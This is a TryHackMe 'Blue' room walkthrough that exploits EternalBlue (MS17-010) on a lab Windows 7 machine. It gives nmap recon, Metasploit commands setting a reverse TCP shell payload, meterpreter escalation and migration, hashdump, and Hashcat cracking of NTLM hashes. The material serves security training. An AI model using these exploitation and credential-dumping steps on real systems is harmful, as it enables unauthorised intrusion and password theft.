# 🧠 TryHackMe Room: Blue 

**Room URL:** [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)  
**Author:** Schenkee  
**Profile:** [https://tryhackme.com/p/schenkee](https://tryhackme.com/p/schenkee)  

---

## 🧩 Challenge Task Overview

**Objective:**   
This guide will cover the steps required to gain the answer to all questions in the Blue room which focuses on the EternalBlue vulnerability in SMB and is the conclusion to the Metasploit module. 

---

## 🧰 Tools I Used  
- nmap
- Metasploit
- Hashcat

---

Firstly, let’s start the target machine and give it a few minutes to start all relevant services. I am using the TryHackME AttackBox let’s start this up as well, or alternatively as in my case connect to the TryHackMe VPN to use a self-hosted attacking machine. You can even download the VM for offline usage if required.

---

## 🛠️ Recon: 
First start with a straightforward nmap scan to see which ports are open and what possible path exists into the target machine.  

Run nmap via the following 
```bash  
sudo nmap -sS TARGET_IP
```   
#### ⚙️ **Options**  
**sudo** Needed to run this command as a privileged user otherwise it will perform a 3-way-handshake and be a TCP Connect Scan -sT.  
**-sS** Tells Nmap to perform a TCP SYN Scan.  

This should return the below information.  
![Recon - Nmap](./Images/Recon%20-%20Nmap.png)  
This will give us enough information to answer the first question: **How many ports are open with a port number under 1000?**  

Notice that port 445 is open which is the default port used for Server Message Block (SMB) protocol. SMB is the protocol which is vulnerable to Eternal Blue in certain windows versions. But let’s run another Nmap scan to try to find anything further to verify that this port is indeed vulnerable.  

Run a nmap version scan and default scripts against the target port to see if any further useful information is returned.  

This can be done via 
```
sudo nmap -sS -sV -sC TARGET_IP -p 445
```
#### ⚙️ **Options**  
**sudo** Needed to run this command as a privileged user otherwise it will perform a 3-way-handshake and be a TCP Connect Scan -sT.  
**-sS** Tells Nmap to perform a TCP SYN Scan.   
**-sV** Tells Nmap to perform a version scan to detect service versions on each port.  
**-sC** Tells Nmap to perform run default scripts on the target.    
**-p** Tells nmap which port to scan. In this case only port 445 is to be scanned    

This should result in the below output.  
![Recon - Nmap -sV](./Images/Recon%20-%20Nmap%20-sV.png)  
This has returned some very good information namely the OS details. Note that the system is running ***Windows 7 Professional 7601 Service Pack 1***

Let’s do a google search for any vulnerabilities which might be affecting smb on ***Windows 7 Professional 7601 Service Pack 1*** and as expected there are some good results confirming that the target is vulnerable to CVE-2017-0144 Eternal Blue.  
![Recon - Google](./Images/Recon%20-%20Google.png)  
Results returned on ExploitDB  
![Recon - ExploitDB](./Images/Recon%20-%20ExploitDB.png)  
This provides us the answer to the next and final question for the Recon section: ***What is this machine vulnerable to?***  

This concludes the required Reconnaissance for the room and now move on to gain access to the target machine.

---

## 🛠️ Gain Access: 
In the Recon section it was identified that the target machine is vulnerable to MS17_010 aka EternalBlue. 

So, let’s start up Metasploit using
```bash
msfconsole
```  

Now let’s see if there are any relevant modules available to us via 
```bash
search ms17-010
``` 
this will bring back the below results.  
![Gain Access - search](./Images/Gain%20Access%20-%20search.png)  
In this instance use the first result, to load this module type 
```bash
use 0
```  

This will also now provide us with the answer to the first question in this section: **Find the exploitation code we will run against the machine. What is the full path of the code?**  

Now that the module is loaded the options need to be configured. Firstly, let’s view the options via 
```bash
show options
```  
![Gain Access - Initial options](./Images/Gain%20Access%20-%20Initial%20options.png)  
The items that need to be changed are **RHOSTS**, **LHOST** and the **Payload**  Noting that only the **RHOSTS** is empty and required to be set for the module. The **LHOST** is part of the payload options.  

Do this via the following commands  
```bash
set RHOSTS TARGET_IP  
set LHOST YOUR_MACHINE_IP  
set payload windows/x64/shell/reverse_tcp
```  

This should give you the information to answer the next question: **Show options and set the one required value. What is the name of this value?**  

Now view the options again via ```show options``` and confirm the remote and local host IPs are correct and that the payload has been adjusted as required.  
![Gain Access - options final](./Images/Gain%20Access%20-%20options%20final.png)  

Once everything is set, type in ```run``` or ```exploit``` to start the attack on the target machine.  This may take a minute to complete and once done you should have access to the target machine.  
![Gain Access - Exploit](./Images/Gain%20Access%20-%20Exploit.png)  

Lastly, background this session via ```CTRL + Z``` to proceed onto the next phase of the attack to escalate the standard shell to a meterpreter session.  

To confirm the session has been backgrounded and is still active type in ```sessions -i``` into the main msfconsole.  
![Gain Access - Background](./Images/Gain%20Access%20-%20Background.png)  

---

## 🛠️ Escalate: 

Now let’s work on gaining a meterpreter session.   

Firstly, load the post exploit module via the following command  ```use post/multi/manage/shell_to_meterpreter```  
![Escalate - Meterpreter](./Images/Escalate%20-%20Meterpreter.png)
This will also provide you the answer to the first question in this section of the room: **What is the name of the post module we will use?**

Once this module has been loaded let’s view the options via ```show options``` here there is one **Required** empty option needing to be update.  
This will also provide you the answer to the next question: **Show options, what option are we required to change?**

To set this option input ```set session SESSION_NUMBER``` you can view the active sessions via ```sessions -i``` and the session number to use is that of the standard shell on the target system. In my case this is session 1.  
![Escalate - Meterpreter Options set](./Images/Escalate%20-%20Meterpreter%20Options%20set.png)  

Once the options have been set input ```run``` to start the module and if all has worked after a minute or so you should have an active meterpreter session.  
This can be confirmed with ```sessions -i``` where there should now be two active sessions on the target.  
![Escalate Meterpreter sessions](./Images/Escalate%20Meterpreter%20sessions.png)

Now follow the guide and confirm the session is running as **SYSTEM** via the ```getsystem``` command and as below it is confirmed the session is already running as **SYSTEM**  
![Escalate - System command](./Images/Escalate%20-%20System%20command.png)

Lastly the guide mentions to migrate to a different process ID. Firstly input ```ps``` to list all running system processes which will provide the **PID** which is used to identify running system processes. This can be useful if the process meterpreter is running as does not have **SYSTEM** privileges.  

It is also worth to check which process the session is running as which can be done via ```getpid``` this will provide the running meterpreter session pid and help aid understanding if migration is needed or not. Although migration may not be strictly necessary in this case, it is included to demonstrate process persistence techniques. Let’s migrate to a different process using ```migrate PID``` 
![Escalate - Pid and Migrate](./Images/Escalate%20-%20Pid%20and%20Migrate.png)  
This may sometimes return errors in which case try a different pid.

Now that access has been gained to the target machine and escalated to a meterpreter session, it’s time to get some information out of the system.

---

## 🛠️ Cracking: 

Let's proceed by first dumping the hashes of the target machines user passwords. This can be done with a meterpreter command ```hashdump```  

This might take a minute but once completed will dump the username and hash details in the terminal.  
![Cracking - Hashdump](./Images/Cracking%20-%20Hashdump.png)  
This will provide the details to answer the first question of this section: **What is the name of the non-default user?**  

Now open a text file on the attacking machine with a preferred text editor and paste in the final portion **Jon's** password hash as below.  
![Cracking - jon.txt](./Images/Cracking%20-%20jon.txt.png)  

Once the file has been saved use **Hashcat** to crack this.  

Use the following command ```hashcat -m 1000 -a 0 HASH_FILE /LOCATION_OF_PASSWORD_LIST``` 
#### ⚙️ **Options**  
**-m** Is used to identify the hash type. More details can be found here [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) In this case it’s a windows hash so NTLM which is code 1000.  
**-a** This specifies the attackmode to be used. In this instance attackmode 0 - Dictionary Attack.  
For the password list using rockyou.txt will be sufficient.  
![Cracking - Hashcat start](./Images/Cracking%20-%20Hashcat%20start.png)  

After a few moments hashcat should finish and provide the password that matches the hash.  
![Cracking - Hashcat end](./Images/Cracking%20-%20Hashcat%20end.png)  
This will be the answer to the second question in the cracking section: **What is the cracked password?**  

---

## 🛠️ Find flags!: 

Finally let’s go and grab out flags to complete this room. 

I found it easier to return to the standard shell to get the flags. If needed changing sessions can be achieved via the below.  
```CTRL+Z``` to background the meterpreter session and then ```sessions -i STANDARD_SESSION_NUMBER``` to change back to the standard session.  
![Flags - Change session](./Images/Flags%20-%20Change%20session.png)  

The guide provides a few clues as to the flag locations - ***This flag can be found at the system root.*** Which on Windows would be ```C:\```  

Navigate from ```C:\Windows\system32``` which is the default location for the standard shell on commencement to ```C:\``` via ```cd ..\..```  

Once in the root directory confirm the flags presence via ```dir```  

To output the flag value input ```type flag1.txt```  
![Flags - Flag1](./Images/Flags%20-%20Flag1.png)  

For flag two the following clue is provided - ***This flag can be found at the location where passwords are stored within Windows.***  
Windows stores passwords in the following location ```C:\Windows\System32\Config``` this is incidentally also where the meterpreter hashdump command retrieves the data from, namely from the **SAM** and **SYSTEM** files.  

Move to this directory from ```C:\``` via ```cd Windows\System32\Config``` and confirm the flags presence via ```dir```  

To output the flag input ```type flag2.txt```  
![Flags - Flag2](./Images/Flags%20-%20Flag2.png)  

For the final flag the following clue is provided - ***This flag can be found in an excellent location to loot. After all, Administrators usually have interesting things saved.***   
This could point to either the **Documents** folder or the **Desktop** folder of the named used **Jon**  

Navigate from ```C:\Windows\System32\Config``` to ```C:\Users\Jon\Documents``` once in the required folder input ```dir``` to confirm the flags presence.  

Output the flag file value via ```type flag3.txt```  
![Flag - Flag3](./Images/Flags%20-%20flag3.png)  

---

## 🧠 Takeaways  

- Identified SMB service and OS details with Nmap, confirming vulnerability to MS17-010 (EternalBlue).  
- Exploited EternalBlue with Metasploit to gain an initial shell and escalate to a meterpreter session.  
- Practiced post-exploitation steps such as privilege verification, process migration, and session management.  
- Extracted NTLM password hashes with meterpreter and successfully cracked them using Hashcat.  
- Reinforced the structured workflow: reconnaissance → exploitation → privilege escalation → credential harvesting → persistence and validation.  

---

Thank you for following through my guide of the TryHackMe Blue.  
